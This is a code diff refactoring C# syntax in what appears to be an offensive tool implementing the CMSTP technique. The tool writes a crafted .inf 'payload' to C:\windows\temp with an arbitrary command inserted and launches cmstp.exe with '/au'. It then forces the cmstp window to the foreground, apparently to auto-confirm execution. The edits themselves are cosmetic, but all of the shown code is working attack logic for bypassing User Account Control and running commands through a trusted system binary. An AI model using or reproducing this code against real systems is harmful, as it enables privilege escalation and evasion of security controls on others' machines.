@@ -44,12 +44,12 @@ ShortSvcName=""VPN""
     {
         string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
         string TemporaryDir = "C:\\windows\\temp";
-        StringBuilder OutputFile = new StringBuilder();
+        StringBuilder OutputFile = new();
         OutputFile.Append(TemporaryDir);
         OutputFile.Append("\\");
         OutputFile.Append(RandomFileName);
         OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
+        StringBuilder newInfData = new(InfData);
         newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
         File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
         return OutputFile.ToString();
@@ -62,20 +62,18 @@ ShortSvcName=""VPN""
             Console.WriteLine("Could not find cmstp.exe binary!");
             return false;
         }
-        StringBuilder InfFile = new StringBuilder();
+        StringBuilder InfFile = new();
         InfFile.Append(SetInfFile(CommandToExecute));
 
         Console.WriteLine("Payload file written to " + InfFile.ToString());
-        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath)
+        ProcessStartInfo startInfo = new(BinaryPath)
         {
             Arguments = "/au " + InfFile.ToString(),
             UseShellExecute = false
         };
 
         Process.Start(startInfo);
-
-        IntPtr windowHandle = new IntPtr();
-        windowHandle = IntPtr.Zero;
+        IntPtr windowHandle;
         do
         {
             windowHandle = SetWindowActive("cmstp");
@@ -90,8 +88,7 @@ ShortSvcName=""VPN""
         Process[] target = Process.GetProcessesByName(ProcessName);
         if (target.Length == 0) return IntPtr.Zero;
         target[0].Refresh();
-        IntPtr WindowHandle = new IntPtr();
-        WindowHandle = target[0].MainWindowHandle;
+        IntPtr WindowHandle = target[0].MainWindowHandle;
         if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
         SetForegroundWindow(WindowHandle);
         ShowWindow(WindowHandle, 5);
